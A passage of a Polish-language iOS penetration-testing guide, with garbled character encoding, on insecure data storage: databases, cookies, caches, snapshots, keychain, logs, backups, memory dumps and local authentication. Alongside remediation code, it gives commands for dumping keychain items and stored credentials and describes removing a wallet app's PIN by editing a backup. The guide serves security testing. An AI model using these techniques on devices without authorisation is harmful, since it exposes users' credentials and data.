[Realm Objective-C](https://realm.io/docs/objc/latest/) i [Realm Swift](https://realm.io/docs/swift/latest/) oferujÄ… potÄ™Å¼nÄ… alternatywÄ™ dla przechowywania danych, ktÃ³rej nie zapewnia Apple. DomyÅ›lnie **przechowujÄ… dane w postaci niezaszyfrowanej**, z moÅ¼liwoÅ›ciÄ… szyfrowania dostÄ™pnÄ… poprzez odpowiedniÄ… konfiguracjÄ™.

Bazy danych znajdujÄ… siÄ™ w: `/private/var/mobile/Containers/Data/Application/{APPID}`. Aby zbadaÄ‡ te pliki, moÅ¼na wykorzystaÄ‡ polecenia takie jak:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Aby wyÅ›wietliÄ‡ te pliki bazy danych, zaleca siÄ™ uÅ¼ycie narzÄ™dzia [**Realm Studio**](https://github.com/realm/realm-studio).

Aby wdroÅ¼yÄ‡ szyfrowanie w bazie danych Realm, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego fragmentu kodu:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bazy danych Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) jest opisywany jako **lekki** i **wbudowany** silnik bazy danych, ktÃ³ry stosuje podejÅ›cie **zorientowane na dokumenty** (NoSQL). Zaprojektowany z myÅ›lÄ… o **iOS** i **macOS**, oferuje moÅ¼liwoÅ›Ä‡ bezproblemowej synchronizacji danych.

Aby zidentyfikowaÄ‡ potencjalne bazy danych Couchbase na urzÄ…dzeniu, naleÅ¼y sprawdziÄ‡ nastÄ™pujÄ…cy katalog:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

iOS przechowuje ciasteczka aplikacji w **`Library/Cookies/cookies.binarycookies`** wewnÄ…trz folderu kaÅ¼dej aplikacji. Jednak deweloperzy czasami decydujÄ… siÄ™ zapisaÄ‡ je w **keychain**, poniewaÅ¼ wspomniany **plik cookie moÅ¼e byÄ‡ dostÄ™pny w kopiach zapasowych**.

Aby sprawdziÄ‡ plik ciasteczek, moÅ¼esz uÅ¼yÄ‡ [**tego skryptu python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) lub uÅ¼yÄ‡ **`ios cookies get`** z objection.\
**MoÅ¼esz takÅ¼e uÅ¼yÄ‡ objection, aby** przekonwertowaÄ‡ te pliki na format JSON i sprawdziÄ‡ dane.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

DomyÅ›lnie NSURLSession przechowuje dane, takie jak **Å¼Ä…dania i odpowiedzi HTTP w bazie danych Cache.db**. Ta baza danych moÅ¼e zawieraÄ‡ **wraÅ¼liwe dane**, jeÅ›li tokeny, nazwy uÅ¼ytkownikÃ³w lub jakiekolwiek inne wraÅ¼liwe informacje zostaÅ‚y zbuforowane. Aby znaleÅºÄ‡ zbuforowane informacje, otwÃ³rz katalog danych aplikacji (`/var/mobile/Containers/Data/Application/<UUID>`) i przejdÅº do `/Library/Caches/<Bundle Identifier>`. **Cache WebKit jest rÃ³wnieÅ¼ przechowywany w pliku Cache.db**. **Objection** moÅ¼e otworzyÄ‡ i interagowaÄ‡ z bazÄ… danych za pomocÄ… polecenia `sqlite connect Cache.db`, poniewaÅ¼ jest to **normalna baza danych SQLite**.

Zaleca siÄ™ **wyÅ‚Ä…czenie buforowania tych danych**, poniewaÅ¼ mogÄ… one zawieraÄ‡ wraÅ¼liwe informacje w Å¼Ä…daniu lub odpowiedzi. PoniÅ¼sza lista pokazuje rÃ³Å¼ne sposoby osiÄ…gniÄ™cia tego:

1. Zaleca siÄ™ usuniÄ™cie zbuforowanych odpowiedzi po wylogowaniu. MoÅ¼na to zrobiÄ‡ za pomocÄ… metody dostarczonej przez Apple o nazwie [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). MoÅ¼esz wywoÅ‚aÄ‡ tÄ™ metodÄ™ w nastÄ™pujÄ…cy sposÃ³b:

`URLCache.shared.removeAllCachedResponses()`

Ta metoda usunie wszystkie zbuforowane Å¼Ä…dania i odpowiedzi z pliku Cache.db.
2. JeÅ›li nie potrzebujesz korzystaÄ‡ z zalet ciasteczek, zaleca siÄ™ po prostu uÅ¼ycie wÅ‚aÅ›ciwoÅ›ci konfiguracyjnej [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) URLSession, ktÃ³ra wyÅ‚Ä…czy zapisywanie ciasteczek i buforÃ³w.

[Dokumentacja Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Obiekt konfiguracyjny sesji efemerycznej jest podobny do domyÅ›lnej konfiguracji sesji (patrz domyÅ›lna), z tÄ… rÃ³Å¼nicÄ…, Å¼e odpowiadajÄ…cy obiekt sesji nie przechowuje buforÃ³w, magazynÃ³w poÅ›wiadczeÅ„ ani Å¼adnych danych zwiÄ…zanych z sesjÄ… na dysku. Zamiast tego dane zwiÄ…zane z sesjÄ… sÄ… przechowywane w RAM. Jedynym razem, gdy sesja efemeryczna zapisuje dane na dysku, jest wtedy, gdy powiesz jej, aby zapisaÅ‚a zawartoÅ›Ä‡ URL do pliku.`
3. Bufor moÅ¼na rÃ³wnieÅ¼ wyÅ‚Ä…czyÄ‡, ustawiajÄ…c politykÄ™ buforowania na [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). WyÅ‚Ä…czy to przechowywanie bufora w jakiejkolwiek formie, zarÃ³wno w pamiÄ™ci, jak i na dysku.

### Snapshots

Kiedy naciÅ›niesz przycisk home, iOS **robi zrzut ekranu bieÅ¼Ä…cego ekranu**, aby mÃ³c przejÅ›Ä‡ do aplikacji w znacznie pÅ‚ynniejszy sposÃ³b. Jednak jeÅ›li na bieÅ¼Ä…cym ekranie znajdujÄ… siÄ™ **wraÅ¼liwe** **dane**, zostanÄ… one **zapisane** w **obrazie** (ktÃ³ry **utrzymuje siÄ™** **po** **ponownym uruchomieniu**). To sÄ… zrzuty ekranu, do ktÃ³rych moÅ¼esz rÃ³wnieÅ¼ uzyskaÄ‡ dostÄ™p, podwÃ³jnie stukajÄ…c w ekran gÅ‚Ã³wny, aby przeÅ‚Ä…czaÄ‡ siÄ™ miÄ™dzy aplikacjami.

O ile iPhone nie jest zrootowany, **atakujÄ…cy** musi mieÄ‡ **dostÄ™p** do **urzÄ…dzenia** **odblokowanego**, aby zobaczyÄ‡ te zrzuty ekranu. DomyÅ›lnie ostatni zrzut ekranu jest przechowywany w piaskownicy aplikacji w folderze `Library/Caches/Snapshots/` lub `Library/SplashBoard/Snapshots` (zaufane komputery nie mogÄ… uzyskaÄ‡ dostÄ™pu do systemu plikÃ³w od iOX 7.0).

Jednym ze sposobÃ³w zapobiegania temu zÅ‚emu zachowaniu jest umieszczenie pustego ekranu lub usuniÄ™cie wraÅ¼liwych danych przed zrobieniem zrzutu ekranu za pomocÄ… funkcji `ApplicationDidEnterBackground()`.

PoniÅ¼ej znajduje siÄ™ przykÅ‚adowa metoda naprawcza, ktÃ³ra ustawi domyÅ›lny zrzut ekranu.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
To ustawia tÅ‚o na `overlayImage.png` za kaÅ¼dym razem, gdy aplikacja jest w tle. Zapobiega to wyciekom wraÅ¼liwych danych, poniewaÅ¼ `overlayImage.png` zawsze zastÄ™puje bieÅ¼Ä…cy widok.

### Keychain

Aby uzyskaÄ‡ dostÄ™p i zarzÄ…dzaÄ‡ iOS keychain, dostÄ™pne sÄ… narzÄ™dzia takie jak [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper), odpowiednie dla urzÄ…dzeÅ„ z jailbreakiem. Dodatkowo, [**Objection**](https://github.com/sensepost/objection) oferuje polecenie `ios keychain dump` do podobnych celÃ³w.

#### **Przechowywanie poÅ›wiadczeÅ„**

Klasa **NSURLCredential** jest idealna do zapisywania wraÅ¼liwych informacji bezpoÅ›rednio w keychain, omijajÄ…c potrzebÄ™ uÅ¼ywania NSUserDefaults lub innych opakowaÅ„. Aby przechowaÄ‡ poÅ›wiadczenia po zalogowaniu, uÅ¼ywany jest nastÄ™pujÄ…cy kod Swift:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Aby wyodrÄ™bniÄ‡ te zapisane dane uwierzytelniajÄ…ce, uÅ¼ywana jest komenda Objection `ios nsurlcredentialstorage dump`.

## **Niestandardowe Klawiatury i PamiÄ™Ä‡ Klawiatury**

Od iOS 8.0 uÅ¼ytkownicy mogÄ… instalowaÄ‡ niestandardowe rozszerzenia klawiatur, ktÃ³re sÄ… zarzÄ…dzane w **Ustawienia > OgÃ³lne > Klawiatura > Klawiatury**. ChociaÅ¼ te klawiatury oferujÄ… rozszerzonÄ… funkcjonalnoÅ›Ä‡, niosÄ… ryzyko rejestrowania naciÅ›niÄ™Ä‡ klawiszy i przesyÅ‚ania danych do zewnÄ™trznych serwerÃ³w, chociaÅ¼ uÅ¼ytkownicy sÄ… informowani o klawiaturach wymagajÄ…cych dostÄ™pu do sieci. Aplikacje mogÄ… i powinny ograniczaÄ‡ uÅ¼ycie niestandardowych klawiatur do wprowadzania wraÅ¼liwych informacji.

**Zalecenia dotyczÄ…ce bezpieczeÅ„stwa:**

* Zaleca siÄ™ wyÅ‚Ä…czenie klawiatur firm trzecich w celu zwiÄ™kszenia bezpieczeÅ„stwa.
* NaleÅ¼y byÄ‡ Å›wiadomym funkcji automatycznej korekty i podpowiedzi domyÅ›lnej klawiatury iOS, ktÃ³re mogÄ… przechowywaÄ‡ wraÅ¼liwe informacje w plikach pamiÄ™ci podrÄ™cznej znajdujÄ…cych siÄ™ w `Library/Keyboard/{locale}-dynamic-text.dat` lub `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Te pliki pamiÄ™ci podrÄ™cznej powinny byÄ‡ regularnie sprawdzane pod kÄ…tem wraÅ¼liwych danych. Zaleca siÄ™ zresetowanie sÅ‚ownika klawiatury za pomocÄ… **Ustawienia > OgÃ³lne > Resetuj > Zresetuj sÅ‚ownik klawiatury** w celu usuniÄ™cia danych z pamiÄ™ci podrÄ™cznej.
* Przechwytywanie ruchu sieciowego moÅ¼e ujawniÄ‡, czy niestandardowa klawiatura przesyÅ‚a naciÅ›niÄ™cia klawiszy zdalnie.

### **Zapobieganie PamiÄ™ci PodrÄ™cznej Pola Tekstowego**

ProtokÃ³Å‚ [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) oferuje wÅ‚aÅ›ciwoÅ›ci do zarzÄ…dzania automatycznÄ… korektÄ… i bezpiecznym wprowadzaniem tekstu, co jest niezbÄ™dne do zapobiegania pamiÄ™ci podrÄ™cznej wraÅ¼liwych informacji. Na przykÅ‚ad, wyÅ‚Ä…czenie automatycznej korekty i wÅ‚Ä…czenie bezpiecznego wprowadzania tekstu moÅ¼na osiÄ…gnÄ…Ä‡ za pomocÄ…:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Dodatkowo, deweloperzy powinni upewniÄ‡ siÄ™, Å¼e pola tekstowe, szczegÃ³lnie te do wprowadzania wraÅ¼liwych informacji, takich jak hasÅ‚a i PIN-y, wyÅ‚Ä…czajÄ… pamiÄ™Ä‡ podrÄ™cznÄ…, ustawiajÄ…c `autocorrectionType` na `UITextAutocorrectionTypeNo` i `secureTextEntry` na `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logi**

Debugowanie kodu czÄ™sto wiÄ…Å¼e siÄ™ z uÅ¼yciem **logowania**. Istnieje ryzyko, Å¼e **logi mogÄ… zawieraÄ‡ wraÅ¼liwe informacje**. WczeÅ›niej, w iOS 6 i wczeÅ›niejszych wersjach, logi byÅ‚y dostÄ™pne dla wszystkich aplikacji, co stwarzaÅ‚o ryzyko wycieku wraÅ¼liwych danych. **Teraz aplikacje majÄ… ograniczony dostÄ™p tylko do swoich logÃ³w**.

Pomimo tych ograniczeÅ„, **atakujÄ…cy z fizycznym dostÄ™pem** do odblokowanego urzÄ…dzenia moÅ¼e nadal to wykorzystaÄ‡, podÅ‚Ä…czajÄ…c urzÄ…dzenie do komputera i **czytajÄ…c logi**. WaÅ¼ne jest, aby zauwaÅ¼yÄ‡, Å¼e logi pozostajÄ… na dysku nawet po odinstalowaniu aplikacji.

Aby zminimalizowaÄ‡ ryzyko, zaleca siÄ™ **dokÅ‚adne interakcje z aplikacjÄ…**, eksplorujÄ…c wszystkie jej funkcjonalnoÅ›ci i dane wejÅ›ciowe, aby upewniÄ‡ siÄ™, Å¼e Å¼adne wraÅ¼liwe informacje nie sÄ… rejestrowane przypadkowo.

Przy przeglÄ…daniu kodu ÅºrÃ³dÅ‚owego aplikacji w poszukiwaniu potencjalnych wyciekÃ³w, naleÅ¼y szukaÄ‡ zarÃ³wno **zdefiniowanych**, jak i **niestandardowych instrukcji logowania** przy uÅ¼yciu sÅ‚Ã³w kluczowych takich jak `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` dla funkcji wbudowanych oraz wszelkich wzmiankach o `Logging` lub `Logfile` dla niestandardowych implementacji.

### **Monitorowanie logÃ³w systemowych**

Aplikacje rejestrujÄ… rÃ³Å¼ne informacje, ktÃ³re mogÄ… byÄ‡ wraÅ¼liwe. Aby monitorowaÄ‡ te logi, uÅ¼yj narzÄ™dzi i poleceÅ„ takich jak:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
sÄ… przydatne. Dodatkowo, **Xcode** oferuje sposÃ³b na zbieranie logÃ³w konsoli:

1. OtwÃ³rz Xcode.
2. PodÅ‚Ä…cz urzÄ…dzenie iOS.
3. PrzejdÅº do **Window** -> **Devices and Simulators**.
4. Wybierz swoje urzÄ…dzenie.
5. WywoÅ‚aj problem, ktÃ³ry badaÅ‚eÅ›.
6. UÅ¼yj przycisku **Open Console**, aby wyÅ›wietliÄ‡ logi w nowym oknie.

Dla bardziej zaawansowanego logowania, poÅ‚Ä…czenie z powÅ‚okÄ… urzÄ…dzenia i uÅ¼ycie **socat** moÅ¼e zapewniÄ‡ monitorowanie logÃ³w w czasie rzeczywistym:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Followed by commands to observe log activities, which can be invaluable for diagnosing issues or identifying potential data leakage in logs.

***

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Kopie zapasowe

**Funkcje automatycznego tworzenia kopii zapasowych** sÄ… zintegrowane z iOS, co uÅ‚atwia tworzenie kopii danych urzÄ…dzenia za pomocÄ… iTunes (do macOS Catalina), Findera (od macOS Catalina wzwyÅ¼) lub iCloud. Te kopie zapasowe obejmujÄ… prawie wszystkie dane urzÄ…dzenia, z wyjÄ…tkiem wysoce wraÅ¼liwych elementÃ³w, takich jak szczegÃ³Å‚y Apple Pay i konfiguracje Touch ID.

### Ryzyka bezpieczeÅ„stwa

WÅ‚Ä…czenie **zainstalowanych aplikacji i ich danych** do kopii zapasowych podnosi kwestiÄ™ potencjalnego **wycieku danych** oraz ryzyko, Å¼e **zmiany w kopiach zapasowych mogÄ… wpÅ‚ynÄ…Ä‡ na funkcjonalnoÅ›Ä‡ aplikacji**. Zaleca siÄ™, aby **nie przechowywaÄ‡ wraÅ¼liwych informacji w postaci tekstu jawnego** w katalogu aplikacji ani jej podkatalogach, aby zminimalizowaÄ‡ te ryzyka.

### Wykluczanie plikÃ³w z kopii zapasowych

Pliki w `Documents/` i `Library/Application Support/` sÄ… domyÅ›lnie kopiowane. ProgramiÅ›ci mogÄ… wykluczyÄ‡ konkretne pliki lub katalogi z kopii zapasowych, uÅ¼ywajÄ…c `NSURL setResourceValue:forKey:error:` z kluczem `NSURLIsExcludedFromBackupKey`. Ta praktyka jest kluczowa dla ochrony wraÅ¼liwych danych przed uwzglÄ™dnieniem w kopiach zapasowych.

### Testowanie pod kÄ…tem podatnoÅ›ci

Aby oceniÄ‡ bezpieczeÅ„stwo kopii zapasowej aplikacji, zacznij od **utworzenia kopii zapasowej** za pomocÄ… Findera, a nastÄ™pnie zlokalizuj jÄ…, korzystajÄ…c z wskazÃ³wek zawartych w [oficjalnej dokumentacji Apple](https://support.apple.com/en-us/HT204215). Analizuj kopiÄ™ zapasowÄ… pod kÄ…tem wraÅ¼liwych danych lub konfiguracji, ktÃ³re mogÄ… byÄ‡ zmieniane, aby wpÅ‚ynÄ…Ä‡ na zachowanie aplikacji.

WraÅ¼liwe informacje moÅ¼na wyszukiwaÄ‡ za pomocÄ… narzÄ™dzi wiersza poleceÅ„ lub aplikacji takich jak [iMazing](https://imazing.com). W przypadku zaszyfrowanych kopii zapasowych obecnoÅ›Ä‡ szyfrowania moÅ¼na potwierdziÄ‡, sprawdzajÄ…c klucz "IsEncrypted" w pliku "Manifest.plist" w katalogu gÅ‚Ã³wnym kopii zapasowej.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Aby poradziÄ‡ sobie z zaszyfrowanymi kopiami zapasowymi, przydatne mogÄ… byÄ‡ skrypty Pythona dostÄ™pne w [repozytorium GitHub DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts), takie jak **backup\_tool.py** i **backup\_passwd.py**, chociaÅ¼ mogÄ… wymagaÄ‡ dostosowaÅ„ w celu zapewnienia zgodnoÅ›ci z najnowszymi wersjami iTunes/Finder. NarzÄ™dzie [**iOSbackup**](https://pypi.org/project/iOSbackup/) to kolejna opcja uzyskania dostÄ™pu do plikÃ³w w zabezpieczonych hasÅ‚em kopiach zapasowych.

### Modyfikowanie zachowania aplikacji

PrzykÅ‚ad zmiany zachowania aplikacji poprzez modyfikacje kopii zapasowej moÅ¼na zobaczyÄ‡ w aplikacji portfela bitcoin [Bither](https://github.com/bither/bither-ios), gdzie PIN blokady UI jest przechowywany w `net.bither.plist` pod kluczem **pin\_code**. UsuniÄ™cie tego klucza z plist i przywrÃ³cenie kopii zapasowej usuwa wymÃ³g podawania PIN-u, zapewniajÄ…c nieograniczony dostÄ™p.

## Podsumowanie testowania pamiÄ™ci w celu ochrony danych

Podczas pracy z wraÅ¼liwymi informacjami przechowywanymi w pamiÄ™ci aplikacji, kluczowe jest ograniczenie czasu ekspozycji tych danych. IstniejÄ… dwa gÅ‚Ã³wne podejÅ›cia do badania zawartoÅ›ci pamiÄ™ci: **tworzenie zrzutu pamiÄ™ci** i **analiza pamiÄ™ci w czasie rzeczywistym**. Obie metody majÄ… swoje wyzwania, w tym moÅ¼liwoÅ›Ä‡ pominiÄ™cia krytycznych danych podczas procesu zrzutu lub analizy.

## **Odzyskiwanie i analiza zrzutu pamiÄ™ci**

Dla urzÄ…dzeÅ„ z jailbreakiem i bez jailbreaka, narzÄ™dzia takie jak [objection](https://github.com/sensepost/objection) i [Fridump](https://github.com/Nightbringer21/fridump) umoÅ¼liwiajÄ… zrzut pamiÄ™ci procesu aplikacji. Po zrzuceniu, analiza tych danych wymaga rÃ³Å¼nych narzÄ™dzi, w zaleÅ¼noÅ›ci od charakteru informacji, ktÃ³rych szukasz.

Aby wyodrÄ™bniÄ‡ ciÄ…gi z zrzutu pamiÄ™ci, moÅ¼na uÅ¼yÄ‡ poleceÅ„ takich jak `strings` lub `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owÄ… analizÄ™, w tym wyszukiwanie konkretnych typÃ³w danych lub wzorcÃ³w, **radare2** oferuje rozbudowane moÅ¼liwoÅ›ci wyszukiwania:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Analiza pamiÄ™ci w czasie rzeczywistym**

**r2frida** oferuje potÄ™Å¼nÄ… alternatywÄ™ do inspekcji pamiÄ™ci aplikacji w czasie rzeczywistym, bez potrzeby zrzutu pamiÄ™ci. To narzÄ™dzie umoÅ¼liwia wykonywanie poleceÅ„ wyszukiwania bezpoÅ›rednio w pamiÄ™ci dziaÅ‚ajÄ…cej aplikacji:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Broken Cryptography

### Poor Key Management Processes

NiektÃ³rzy deweloperzy zapisujÄ… wraÅ¼liwe dane w lokalnej pamiÄ™ci i szyfrujÄ… je kluczem zakodowanym/predykcyjnym w kodzie. Nie powinno siÄ™ tego robiÄ‡, poniewaÅ¼ pewne techniki odwracania mogÄ… pozwoliÄ‡ atakujÄ…cym na wydobycie poufnych informacji.

### Use of Insecure and/or Deprecated Algorithms

Deweloperzy nie powinni uÅ¼ywaÄ‡ **deprecated algorithms** do przeprowadzania **checks** autoryzacji, **store** lub **send** danych. NiektÃ³re z tych algorytmÃ³w to: RC4, MD4, MD5, SHA1... JeÅ›li **hashes** sÄ… uÅ¼ywane do przechowywania haseÅ‚, powinny byÄ‡ uÅ¼ywane hashe odporne na brute-force z solÄ….

### Check

GÅ‚Ã³wne kontrole, ktÃ³re naleÅ¼y przeprowadziÄ‡, to sprawdzenie, czy moÅ¼na znaleÅºÄ‡ **hardcoded** hasÅ‚a/tajemnice w kodzie, czy sÄ… one **predictable**, oraz czy kod uÅ¼ywa jakiegoÅ› rodzaju **weak** **cryptography** algorithms.

Ciekawe jest to, Å¼e moÅ¼na **monitor** niektÃ³re **crypto** **libraries** automatycznie za pomocÄ… **objection** z:
```swift
ios monitor crypt
```
For **wiÄ™cej informacji** na temat iOS cryptographic APIs i bibliotek, odwiedÅº [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Lokalna autoryzacja

**Lokalna autoryzacja** odgrywa kluczowÄ… rolÄ™, szczegÃ³lnie w kontekÅ›cie zabezpieczania dostÄ™pu do zdalnego punktu koÅ„cowego za pomocÄ… metod kryptograficznych. IstotÄ… jest to, Å¼e bez odpowiedniej implementacji mechanizmy lokalnej autoryzacji mogÄ… byÄ‡ obejÅ›cie.

Apple's [**Local Authentication framework**](https://developer.apple.com/documentation/localauthentication) oraz [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) oferujÄ… solidne API dla deweloperÃ³w, aby uÅ‚atwiÄ‡ dialogi autoryzacji uÅ¼ytkownika i bezpiecznie obsÅ‚ugiwaÄ‡ dane poufne. Secure Enclave zabezpiecza identyfikacjÄ™ odcisku palca dla Touch ID, podczas gdy Face ID opiera siÄ™ na rozpoznawaniu twarzy bez kompromitowania danych biometrycznych.

Aby zintegrowaÄ‡ Touch ID/Face ID, deweloperzy majÄ… dwa wybory API:

* **`LocalAuthentication.framework`** dla autoryzacji uÅ¼ytkownika na wysokim poziomie bez dostÄ™pu do danych biometrycznych.
* **`Security.framework`** dla dostÄ™pu do usÅ‚ug keychain na niÅ¼szym poziomie, zabezpieczajÄ…c dane poufne za pomocÄ… autoryzacji biometrycznej. RÃ³Å¼ne [open-source wrappers](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) uÅ‚atwiajÄ… dostÄ™p do keychain.

{% hint style="danger" %}
Jednak zarÃ³wno `LocalAuthentication.framework`, jak i `Security.framework` majÄ… luki, poniewaÅ¼ gÅ‚Ã³wnie zwracajÄ… wartoÅ›ci boolean bez przesyÅ‚ania danych do procesÃ³w autoryzacji, co czyni je podatnymi na obejÅ›cie (zobacz [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementacja lokalnej autoryzacji

Aby poprosiÄ‡ uÅ¼ytkownikÃ³w o autoryzacjÄ™, deweloperzy powinni wykorzystaÄ‡ metodÄ™ **`evaluatePolicy`** w klasie **`LAContext`**, wybierajÄ…c pomiÄ™dzy:

* **`deviceOwnerAuthentication`**: Prosi o Touch ID lub kod dostÄ™pu do urzÄ…dzenia, niepowodzenie, jeÅ›li Å¼adne z nich nie jest wÅ‚Ä…czone.
* **`deviceOwnerAuthenticationWithBiometrics`**: WyÅ‚Ä…cznie prosi o Touch ID.

Sukces autoryzacji wskazuje wartoÅ›Ä‡ boolean zwrÃ³cona przez **`evaluatePolicy`**, co podkreÅ›la potencjalnÄ… lukÄ™ w zabezpieczeniach.

### Lokalna autoryzacja z uÅ¼yciem Keychain

Implementacja **lokalnej autoryzacji** w aplikacjach iOS polega na uÅ¼yciu **keychain APIs** do bezpiecznego przechowywania danych poufnych, takich jak tokeny autoryzacyjne. Proces ten zapewnia, Å¼e dane mogÄ… byÄ‡ dostÄ™pne tylko dla uÅ¼ytkownika, korzystajÄ…cego z kodu dostÄ™pu do urzÄ…dzenia lub autoryzacji biometrycznej, takiej jak Touch ID.

Keychain oferuje moÅ¼liwoÅ›Ä‡ ustawienia elementÃ³w z atrybutem `SecAccessControl`, ktÃ³ry ogranicza dostÄ™p do elementu, dopÃ³ki uÅ¼ytkownik nie uwierzytelni siÄ™ pomyÅ›lnie za pomocÄ… Touch ID lub kodu dostÄ™pu do urzÄ…dzenia. Ta funkcja jest kluczowa dla zwiÄ™kszenia bezpieczeÅ„stwa.

PoniÅ¼ej znajdujÄ… siÄ™ przykÅ‚ady kodu w Swift i Objective-C demonstrujÄ…ce, jak zapisaÄ‡ i odzyskaÄ‡ ciÄ…g z keychain, wykorzystujÄ…c te funkcje zabezpieczeÅ„. PrzykÅ‚ady pokazujÄ…, jak skonfigurowaÄ‡ kontrolÄ™ dostÄ™pu, aby wymagaÄ‡ autoryzacji Touch ID i zapewniÄ‡, Å¼e dane sÄ… dostÄ™pne tylko na urzÄ…dzeniu, na ktÃ³rym zostaÅ‚y skonfigurowane, pod warunkiem, Å¼e kod dostÄ™pu do urzÄ…dzenia jest skonfigurowany.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
